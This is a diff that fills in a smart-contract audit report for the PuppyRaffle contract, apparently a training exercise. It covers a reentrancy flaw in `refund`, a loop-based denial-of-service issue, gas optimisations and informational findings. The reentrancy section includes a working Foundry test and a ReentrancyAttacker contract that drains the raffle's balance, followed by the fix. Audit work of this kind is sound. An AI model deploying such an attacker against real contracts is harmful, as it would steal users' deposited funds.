@@ -1,14 +1,139 @@
-### [S-N] TITLE (Root Cause + Impact)
+# High 
 
-**Description:**
+### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrants to drain contract for raffle balance 
 
-**Impact:**
+**Description** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result enables participants to drain the contract balance 
 
-**Proof Of Concept:**
+In the `PuppyRaffle::refund` we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.
 
-**Recommended Mitigation:**
+```javascript
 
-### [M-N] Looping through players array to check for duplicate in `PuppyRaffle::enterRaffle` is a potential Denial of Service attack (DoS), incrementing gas cost for future entrant 
+function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+        payable(msg.sender).sendValue(entranceFee);
+        
+@>        players[playerIndex] = address(0);
+@>        emit RaffleRefunded(playerAddress);
+    }
+```
+
+A player who has entered the raffle could have a fallback/receive function that calls the `PuppyRaffle::refund` again and claim another refund they could continue the cycle till the contract balance is drained.
+
+**Impact** All fees paid by raffle entrants could be stole by the malicious player 
+
+**Proof of Concept**
+1. User enters the raffle
+2. Attacker set up a contract with a `fallback` function that calls `PuppyRaffle::refund`
+3. Attacker enters the raffle 
+4. Attacker calls `PuppyRaffle::refund`from their attack contract, draining the contract balance of the `PuppyRaffle`
+
+**Proof of Code**
+<details> <summary>Code</summary>
+
+Place the following into `PuppyRaffleTest.t.sol`
+
+```javascript 
+
+ function test_reentrancyRefund() public {
+
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attackUser  = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+
+        uint256 startingAttackBalance = address(attackerContract).balance;
+        uint256 startingPuppyBalance = address(puppyRaffle).balance; 
+
+        vm.prank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("starting attack contract balance", startingAttackBalance);
+        console.log("starting puppy contract balance", startingPuppyBalance);
+
+        console.log("ending attack contract balance", address(attackerContract).balance);
+        console.log("ending puppy contract balance", address(puppyRaffle).balance);
+
+
+    }
+
+
+```
+And this contract as well 
+
+```javascript 
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle; 
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle){
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if(address(puppyRaffle).balance >= entranceFee){
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+       _stealMoney();
+    }
+
+    receive() external payable {
+       _stealMoney();
+    }
+}
+
+```
+
+</details>
+
+**Recomended Mitigation** 
+
+To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array first before making the external call. Additionally we should move the event emission up as well
+
+```diff
+
+function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
++       players[playerIndex] = address(0);
++       emit RaffleRefunded(playerAddress);
+
+        payable(msg.sender).sendValue(entranceFee);
+        
+-        players[playerIndex] = address(0);
+-        emit RaffleRefunded(playerAddress);
+    }
+
+```
+
+# Medium
+
+## [M-N] Looping through players array to check for duplicate in `PuppyRaffle::enterRaffle` is a potential Denial of Service attack (DoS), incrementing gas cost for future entrant 
 
 **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the  `PuppyRaffle::players` array the more checks a player will have to make. This means the gas costs for players who entered earlier will be dramatically lower than the gas cost for players who enters later. Every additional address that is pushed to the array is an additional check that has to be made by players.
 
@@ -123,18 +248,39 @@ Place the following test into PuppyRaffleTest.t.sol
 
 Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).
 
+# Gas
 
-### [S-N] TITLE (Root Cause + Impact)
+### [G-1] Unchanged state variables should be declared as immutable or constant
 
-**Description:**
+Reading from a storage variable is more expensive than reading from a constant  or immutable variables  
 
-**Impact:**
+Instances
+- `PuppyRaffle::raffleDuration` should be `immutable`
+- `PuppyRaffle::commonImageUri` should be `constant`
+- `PuppyRaffle::rareImageUri` should be `constant`
+- `PuppyRaffle::legendaryImageUri` should be `constant`
 
-**Proof Of Concept:**
+### [G-2] Storage variable in a loop should be cached 
 
-**Recommended Mitigation:**
+Everytime you call `players.lenght` you read from storage as opposed to memory which is more gas efficient 
 
-## [L-2] Solidity pragma should be specific, not wide
+``` diff
++    uint256 playersLength = players.length 
+-    for (uint256 i = 0; i < players.length - 1; i++) {
++    for (uint256 i = 0; i < playersLength - 1; i++) {
+-               for (uint256 j = i + 1; j < players.length; j++) {
++               for (uint256 j = i + 1; j < playersLength; j++) {
+                    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+                }
+            }
+
+
+```
+
+
+# Informational
+
+### [I-1] Solidity pragma should be specific, not wide
 
 Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`
 
@@ -148,3 +294,33 @@ Consider using a specific version of Solidity in your contracts instead of a wid
 	```
 
 </details>
+
+### [I-2] Using an outdated version of solidity is not recommended
+
+solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.
+
+**Recommendation**
+Deploy with a recent version of Solidity (at least `0.8.0`) with no known severe issues.
+
+Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.
+
+Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information 
+
+### [I-3] Missing checks for `address(0)` when assigning values to address state variables
+
+Check for `address(0)` when assigning values to address state variables.
+
+<details><summary>2 Found Instances</summary>
+
+
+- Found in src/PuppyRaffle.sol [Line: 70](src/PuppyRaffle.sol#L70)
+
+	```solidity
+	        feeAddress = _feeAddress;
+	```
+
+- Found in src/PuppyRaffle.sol [Line: 227](src/PuppyRaffle.sol#L227)
+
+	```solidity
+	        feeAddress = newFeeAddress;
+	```
